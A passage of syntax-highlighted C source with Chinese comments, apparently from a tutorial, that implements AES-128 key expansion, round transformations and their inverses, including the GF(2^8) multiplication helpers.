以十六进制显示。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printASSCI</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x &quot;</span>, getIntFromChar(str[i]));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把连续的4个字符合并成一个4字节的整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getWordFromStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three, four;<br>    one = getIntFromChar(str[<span class="hljs-number">0</span>]);<br>    one = one &lt;&lt; <span class="hljs-number">24</span>;<br>    two = getIntFromChar(str[<span class="hljs-number">1</span>]);<br>    two = two &lt;&lt; <span class="hljs-number">16</span>;<br>    three = getIntFromChar(str[<span class="hljs-number">2</span>]);<br>    three = three &lt;&lt; <span class="hljs-number">8</span>;<br>    four = getIntFromChar(str[<span class="hljs-number">3</span>]);<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个4字节的数的第一、二、三、四个字节取出，</span><br><span class="hljs-comment"> * 入进一个4个元素的整型数组里面。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">splitIntToArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three;<br>    one = num &gt;&gt; <span class="hljs-number">24</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = one &amp; <span class="hljs-number">0x000000ff</span>;<br>    two = num &gt;&gt; <span class="hljs-number">16</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] = two &amp; <span class="hljs-number">0x000000ff</span>;<br>    three = num &gt;&gt; <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] = three &amp; <span class="hljs-number">0x000000ff</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>] = num &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将数组中的元素循环左移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">leftLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index++;<br>        index = index % <span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把数组中的第一、二、三和四元素分别作为</span><br><span class="hljs-comment"> * 4字节整型的第一、二、三和四字节，合并成一个4字节整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mergeArrayToInt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one = <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>;<br>    <span class="hljs-keyword">int</span> two = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>    <span class="hljs-keyword">int</span> three = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">int</span> four = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 常量轮值表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Rcon[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x01000000</span>, <span class="hljs-number">0x02000000</span>,<br>                              <span class="hljs-number">0x04000000</span>, <span class="hljs-number">0x08000000</span>,<br>                              <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x20000000</span>,<br>                              <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x80000000</span>,<br>                              <span class="hljs-number">0x1b000000</span>, <span class="hljs-number">0x36000000</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 密钥扩展中的T函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">T</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> numArray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> result;<br>    splitIntToArray(num, numArray);<br>    leftLoop4int(numArray, <span class="hljs-number">1</span>);<span class="hljs-comment">//字循环</span><br><br>    <span class="hljs-comment">//字节代换</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        numArray[i] = getNumFromSBox(numArray[i]);<br><br>    result = mergeArrayToInt(numArray);<br>    <span class="hljs-keyword">return</span> result ^ Rcon[round];<br>&#125;<br><br><span class="hljs-comment">//密钥对应的扩展数组</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> w[<span class="hljs-number">44</span>];<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印W数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printW</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">44</span>; i++,j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w[%d] = 0x%x &quot;</span>, i, w[i]);<br>        <span class="hljs-keyword">if</span>(j % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 扩展密钥，结果是把w[44]中的每个元素初始化</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">extendKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        w[i] = getWordFromStr(key + i * <span class="hljs-number">4</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">4</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span>( i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>) &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ T(w[i - <span class="hljs-number">1</span>], j);<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ w[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 轮密钥加</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> warray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br><br>        splitIntToArray(w[ round * <span class="hljs-number">4</span> + i], warray);<br><br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            <span class="hljs-built_in">array</span>[j][i] = <span class="hljs-built_in">array</span>[j][i] ^ warray[j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 字节代换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">subBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromSBox(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    leftLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    leftLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    leftLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合要用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> colM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,<br>                                <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = s &lt;&lt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> a7 = result &amp; <span class="hljs-number">0x00000100</span>;<br><br>    <span class="hljs-keyword">if</span>(a7 != <span class="hljs-number">0</span>) &#123;<br>        result = result &amp; <span class="hljs-number">0x000000ff</span>;<br>        result = result ^ <span class="hljs-number">0x1b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul2(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul8</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul4(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul9</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul11</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul9(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul12</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ GFMul4(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul13</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul14</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * GF上的二元运算</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result;<br><br>    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)<br>        result = s;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>)<br>        result = GFMul2(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">3</span>)<br>        result = GFMul3(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0x9</span>)<br>        result = GFMul9(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xb</span>)<span class="hljs-comment">//11</span><br>        result = GFMul11(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xd</span>)<span class="hljs-comment">//13</span><br>        result = GFMul13(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xe</span>)<span class="hljs-comment">//14</span><br>        result = GFMul14(s);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(colM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(colM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4X4数组转回字符串</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertArrayToStr</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            *str++ = (<span class="hljs-keyword">char</span>)<span class="hljs-built_in">array</span>[j][i];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 检查密钥长度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">checkKeyLen</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(len == <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引从逆S盒中获取值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromS1Box</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S2[row][col];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆字节变换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deSubBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromS1Box(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4个元素的数组循环右移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rightLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    index = <span class="hljs-number">3</span> - index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index--;<br>        index = index == <span class="hljs-number">-1</span> ? <span class="hljs-number">3</span> : index;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deShiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    rightLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    rightLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    rightLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> deColM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>,<br>                                  <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>,<br>                                  <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>,<br>                                  <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deMixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(deColM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(deColM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把两个4X4数组进行异或</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundTowArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> aArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>],<span class="hljs-keyword">int</span> bArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            aArray[i][j] = aArray[i][j] ^ bArray[i][j];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 从4个32位的密钥字中获得4X4数组，</span><br><span class="hljs-comment"> * 用于进行逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getArrayFrom4W</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> index,j;<br>    <span class="hljs-keyword">int</span> colOne[<span class="hljs-number">4</span>], colTwo[<span class="hljs-number">4</span>], colThree[<span class="hljs-number">4</span>], colFour[<span class="hljs-number">4</span>];<br>    index = i * <span class="hljs-number">4</span>;<br>    splitIntToArray(w[index], colOne);<br>    splitIntToArray(w[index + <span class="hljs-number">1</span>], colTwo);<br>    splitIntToArray(w[index + <span class="hljs-number">2</span>], colThree);<br>    splitIntToArray(w[index + <span class="hljs-number">3</span>], colFour);<br><br>    <span 